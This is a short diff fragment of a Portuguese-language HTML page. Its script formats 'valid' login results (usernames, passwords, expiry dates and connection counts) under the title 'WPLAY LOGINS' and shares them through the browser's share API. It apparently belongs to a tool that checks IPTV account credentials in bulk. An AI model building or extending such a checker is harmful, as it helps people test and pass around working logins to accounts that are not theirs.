+                if (results.length === 0) {
+                    alert('Nenhum resultado válido para compartilhar!');
+                    return;
+                }
+                
+                if (navigator.share) {
+                    let text = '';
+                    results.forEach(result => {
+                        text += `Usuário: ${result.username} | Senha: ${result.password} | Expira: ${result.expiration} | Dias: ${result.daysRemaining} | Conexões: ${result.activeConnections}/${result.maxConnections}\n`;
+                    });
+                    
+                    navigator.share({
+                        title: 'WPLAY LOGINS',
+                        text: text
+                    }).catch(console.error);
+                } else {
+                    alert('Seu navegador não suporta a API de compartilhamento.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
